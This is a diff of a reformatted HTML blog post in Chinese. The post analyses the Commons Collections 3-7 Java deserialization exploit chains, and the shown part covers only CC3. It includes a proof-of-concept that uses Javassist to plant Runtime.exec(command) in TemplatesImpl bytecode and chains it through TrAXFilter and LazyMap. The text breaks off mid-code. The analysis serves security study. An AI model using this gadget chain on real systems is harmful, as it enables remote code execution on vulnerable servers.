@@ -1,135 +1,115 @@
-<!DOCTYPE html>
-<html lang="zh">
-<head><meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-
-
-
-<link rel="stylesheet" href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc="/>
-
-
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel="stylesheet">
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/code-line"></script><title>CommonsCollections3-7 利用连分析</title>
+<!doctype html><html lang=zh>
+<head><meta http-equiv=content-type content="text/html" charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc=">
+<link rel=preconnect href=https://fonts.googleapis.com>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css>
+<script src=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/code-line></script><title>CommonsCollections3-7 利用连分析</title>
 </head>
 <body class="flex flex-col bg-gray-100">
-
 <div class="flex my-8 font-serif">
-    <div class="flex-auto w-1/3">
-        <div class="w-64 h-full mr-2 ml-auto">
-            <div class="mb-8"><div class="border rounded-lg shadow-md">
-    <div class="h-32 flex rounded-t-lg text-white" style="background-image: url('/images/background-1.jpg')">
-        <div class="m-auto">
-            <div class="text-center font-serif text-3xl my-2"><a href="/">Noth</a></div>
-            <div class="text-center font-serif">去码头整点薯条</div>
-        </div>
-    </div>
-    <nav class="rounded-b-lg bg-white">
-        <ul class="py-2 ml-8">
-            <li class="my-2 content-center">
-                <a href="/" class="hover:text-red-300"><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
-            </li>
-
-
-
-            <li class="my-2 content-center">
-                <a href="/metapages/archive/" class="hover:text-red-300"><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/categories/" class="hover:text-red-300"><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/tags/" class="hover:text-red-300"><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/metapages/link/" class="hover:text-red-300"><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/metapages/message/" class="hover:text-red-300"><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
-            </li>
-        </ul>
-    </nav>
+<div class="flex-auto w-1/3">
+<div class="w-64 h-full mr-2 ml-auto">
+<div class=mb-8><div class="border rounded-lg shadow-md">
+<div class="h-32 flex rounded-t-lg text-white" style=background-image:url(/images/background-1.jpg)>
+<div class=m-auto>
+<div class="text-center font-serif text-3xl my-2"><a href=/>Noth</a></div>
+<div class="text-center font-serif">去码头整点薯条</div>
+</div>
+</div>
+<nav class="rounded-b-lg bg-white">
+<ul class="py-2 ml-8">
+<li class="my-2 content-center">
+<a href=/ class=hover:text-red-300><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/archive/ class=hover:text-red-300><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
+</li>
+<li class="my-2 content-center">
+<a href=/categories/ class=hover:text-red-300><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
+</li>
+<li class="my-2 content-center">
+<a href=/tags/ class=hover:text-red-300><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/link/ class=hover:text-red-300><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/message/ class=hover:text-red-300><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
+</li>
+</ul>
+</nav>
 </div></div>
-            <div class="sticky top-2">
-                <div class="toc">
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#commonscollections3">CommonsCollections3</a></li>
-    <li><a href="#commonscollections4">CommonsCollections4</a></li>
-    <li><a href="#commonscollections5">CommonsCollections5</a></li>
-    <li><a href="#commonscollections6">CommonsCollections6</a></li>
-    <li><a href="#commonscollections7">CommonsCollections7</a></li>
-  </ul>
+<div class="sticky top-2">
+<div class=toc>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#commonscollections3>CommonsCollections3</a></li>
+<li><a href=#commonscollections4>CommonsCollections4</a></li>
+<li><a href=#commonscollections5>CommonsCollections5</a></li>
+<li><a href=#commonscollections6>CommonsCollections6</a></li>
+<li><a href=#commonscollections7>CommonsCollections7</a></li>
+</ul>
 </nav>
 </div>
-            </div>
-        </div>
-    </div>
-    <div class="flex-auto w-2/3">
-        <div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
-            <h1 class="font-serif text-4xl text-center mt-8 mb-2">CommonsCollections3-7 利用连分析</h1>
-            <div class="text-right text-gray-500 mr-20">
-                <span>
-                    Sep. 25, 2021 |
-                    <i class="far fa-bookmark"></i> 
-                </span>
-            </div>
-            <div class="content px-6 mb-8">
-                <p>理解了CC1和CC2之后，CC3-7其实十分简单，CC3和CC1类似，但是换了一种命令执行的方式，CC4也是这样；而CC5-7则是寻找到了另外触发LazyMap.get的方式，在这个前提下，就只需要关注与CC1、CC2不同的部分，就可以大体掌握其他链，并且可以更加容易的理解和分析其他链的构造。</p>
-<h2 id="commonscollections3">CommonsCollections3</h2>
+</div>
+</div>
+</div>
+<div class="flex-auto w-2/3">
+<div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
+<h1 class="font-serif text-4xl text-center mt-8 mb-2">CommonsCollections3-7 利用连分析</h1>
+<div class="text-right text-gray-500 mr-20">
+<span>
+Sep. 25, 2021 |
+<i class="far fa-bookmark"></i>
+</span>
+</div>
+<div class="content px-6 mb-8">
+<p>理解了CC1和CC2之后，CC3-7其实十分简单，CC3和CC1类似，但是换了一种命令执行的方式，CC4也是这样；而CC5-7则是寻找到了另外触发LazyMap.get的方式，在这个前提下，就只需要关注与CC1、CC2不同的部分，就可以大体掌握其他链，并且可以更加容易的理解和分析其他链的构造。</p>
+<h2 id=commonscollections3>CommonsCollections3</h2>
 <p>CC3链与CC1链一样是Commons Collections 3.1环境下的利用链，与CC1一样，其也是借助 LazyMap#Get 方法来触发一个 Transformer.transform 方法，区别在于两者构造的Transformer不同，CC1中是通过ChainedTransformer 将多个Transformer连接在一起，通过传递来构造出一个命令执行的表达式；而CC3则是与CC2中对应部分类似，通过动态加载字节码的方式来执行一个命令执行的语句。其构造的链关键部分如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">final</span> Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span>
-        <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-                <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-                <span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span>
-                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Templates<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                        <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>templates<span style="color:#f92672">}</span>
-                <span style="color:#f92672">)</span>
-        <span style="color:#f92672">}</span>
-<span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+        <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
+                <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>TrAXFilter<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+                <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>(</span>
+                        <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Templates<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                        <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>templates<span style=color:#f92672>}</span>
+                <span style=color:#f92672>)</span>
+        <span style=color:#f92672>}</span>
+<span style=color:#f92672>);</span>
 </code></pre></div><p>同是ChainedTransformer，但是其内容则是发生了改变，这里用到了两个新的类：TrAXFilter和InstantiateTransformer。第二个类很明显也是一个Transformer，结合CC1对ChainedTransformer的分析，这里会将TrAXFilter.class作为参数传到InstantiateTransformer中，先看一下这个类是干什么的。如果看源码的话可以从注释得知这个类的作用是利用反射创建一个对象实例，或者看一下transform方法中的定义：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>Objectinput<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>inputinstanceof Class <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException<span style="color:#f92672">(</span>
-                <span style="color:#e6db74">&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a &#34;</span>
-                    <span style="color:#f92672">+</span> <span style="color:#f92672">(</span>input<span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;null object&#34;</span> <span style="color:#f92672">:</span>input<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()));</span>
-        <span style="color:#f92672">}</span>
-        Constructor con <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>Class<span style="color:#f92672">)</span>input<span style="color:#f92672">).</span><span style="color:#a6e22e">getConstructor</span><span style="color:#f92672">(</span>iParamTypes<span style="color:#f92672">);</span>
-        <span style="color:#66d9ef">return</span> con<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>iArgs<span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>Objectinput<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>inputinstanceof Class <span style=color:#f92672>==</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span>
+                <span style=color:#e6db74>&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a &#34;</span>
+                    <span style=color:#f92672>+</span> <span style=color:#f92672>(</span>input<span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;null object&#34;</span> <span style=color:#f92672>:</span>input<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()));</span>
+        <span style=color:#f92672>}</span>
+        Constructor con <span style=color:#f92672>=</span> <span style=color:#f92672>((</span>Class<span style=color:#f92672>)</span>input<span style=color:#f92672>).</span><span style=color:#a6e22e>getConstructor</span><span style=color:#f92672>(</span>iParamTypes<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>return</span> con<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>iArgs<span style=color:#f92672>);</span>
 
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchMethodExceptionex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;InstantiateTransformer: The constructor must exist and be public &#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InstantiationExceptionex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;InstantiateTransformer: InstantiationException&#34;</span><span style="color:#f92672">,</span>ex<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IllegalAccessExceptionex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;InstantiateTransformer: Constructor must be public&#34;</span><span style="color:#f92672">,</span>ex<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InvocationTargetExceptionex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;InstantiateTransformer: Constructor threw an exception&#34;</span><span style="color:#f92672">,</span>ex<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>NoSuchMethodExceptionex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InstantiateTransformer: The constructor must exist and be public &#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InstantiationExceptionex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InstantiateTransformer: InstantiationException&#34;</span><span style=color:#f92672>,</span>ex<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IllegalAccessExceptionex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InstantiateTransformer: Constructor must be public&#34;</span><span style=color:#f92672>,</span>ex<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetExceptionex<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> FunctorException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InstantiateTransformer: Constructor threw an exception&#34;</span><span style=color:#f92672>,</span>ex<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>只看try里的内容就行，逻辑很简单，首先判断input参数是否为Class，如果是的话就会根据参数利用反射获取到这个类的构造函数，然后使用newInstance(iArgs) 初始化一个实例并返回。</p>
 <p>所以，这个ChainedTransformer实际上就是创造一个TrAXFilter对象的过程。那这个TrAXFilter 类有什么特殊之处呢，如果查看其构造函数就会发现为什么用他了：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">TrAXFilter</span><span style="color:#f92672">(</span>Templates templates<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> TransformerConfigurationException <span style="color:#f92672">{</span>
-	_templates <span style="color:#f92672">=</span> templates<span style="color:#f92672">;</span>
-	_transformer <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>TransformerImpl<span style="color:#f92672">)</span> templates<span style="color:#f92672">.</span><span style="color:#a6e22e">newTransformer</span><span style="color:#f92672">();</span>
-	_transformerHandler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformerHandlerImpl<span style="color:#f92672">(</span>_transformer<span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>TrAXFilter</span><span style=color:#f92672>(</span>Templates templates<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> TransformerConfigurationException <span style=color:#f92672>{</span>
+	_templates <span style=color:#f92672>=</span> templates<span style=color:#f92672>;</span>
+	_transformer <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>TransformerImpl<span style=color:#f92672>)</span> templates<span style=color:#f92672>.</span><span style=color:#a6e22e>newTransformer</span><span style=color:#f92672>();</span>
+	_transformerHandler <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerHandlerImpl<span style=color:#f92672>(</span>_transformer<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>这里如果传入参数templates，就会调用 templates.newTransformer()，这不就和CC2中一样了吗。只要和CC2中一样设计 templates，就可以在这个类初始化时调用 newTransformer，达到加载字节码并触发命令执行语句的目的。</p>
 <p>CC3的内容其实已经清楚了，总结一下就是：</p>
 <ol>
@@ -140,241 +120,241 @@
 <li>根据CC2中的分析，只要设计好templates，就可以在调用templates.newTransformer 触发一个命令执行语句。</li>
 </ol>
 <p>PoC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String command<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// TemplatesImpl requires the Class from bytecodes must be a subclass of AbstractTranslet.
-</span><span style="color:#75715e"></span>    Class absTranslet <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String command<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// TemplatesImpl requires the Class from bytecodes must be a subclass of AbstractTranslet.
+</span><span style=color:#75715e></span>    Class absTranslet <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Generate the bytecodes using Javassist
-</span><span style="color:#75715e"></span>    ClassPool pool <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">();</span>
-    pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>absTranslet<span style="color:#f92672">));</span>
-    CtClass clazz <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClass</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CommonsCollections3&#34;</span><span style="color:#f92672">);</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClassInitializer</span><span style="color:#f92672">().</span><span style="color:#a6e22e">insertAfter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span> command <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;);&#34;</span><span style="color:#f92672">);</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setSuperclass</span><span style="color:#f92672">(</span>pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>absTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()));</span>
-    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytecodes <span style="color:#f92672">=</span> clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">();</span>
+    <span style=color:#75715e>// Generate the bytecodes using Javassist
+</span><span style=color:#75715e></span>    ClassPool pool <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
+    pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>absTranslet<span style=color:#f92672>));</span>
+    CtClass clazz <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClass</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;CommonsCollections3&#34;</span><span style=color:#f92672>);</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#a6e22e>insertAfter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span> command <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;\&#34;);&#34;</span><span style=color:#f92672>);</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setSuperclass</span><span style=color:#f92672>(</span>pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>absTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()));</span>
+    <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytecodes <span style=color:#f92672>=</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// Use reflection setting _Bytecodes and _name
-</span><span style="color:#75715e"></span>    TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-    setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bytecodes<span style="color:#f92672">});</span>
-    setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;CommonsCollections3&#34;</span><span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Use reflection setting _Bytecodes and _name
+</span><span style=color:#75715e></span>    TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl<span style=color:#f92672>();</span>
+    setFieldValue<span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]{</span>bytecodes<span style=color:#f92672>});</span>
+    setFieldValue<span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;CommonsCollections3&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Construct a ChainedTransform instantiated a TxAXFilter object
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span>
-            <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-                    <span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Templates<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>templates<span style="color:#f92672">}</span>
-                    <span style="color:#f92672">)</span>
-            <span style="color:#f92672">}</span>
-    <span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Construct a ChainedTransform instantiated a TxAXFilter object
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+            <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>TrAXFilter<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+                    <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>(</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Templates<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>templates<span style=color:#f92672>}</span>
+                    <span style=color:#f92672>)</span>
+            <span style=color:#f92672>}</span>
+    <span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// create lazyMap with transformer
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
-    <span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span>innerMap<span style="color:#f92672">,</span> transformerChain<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// create lazyMap with transformer
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
+    <span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
 
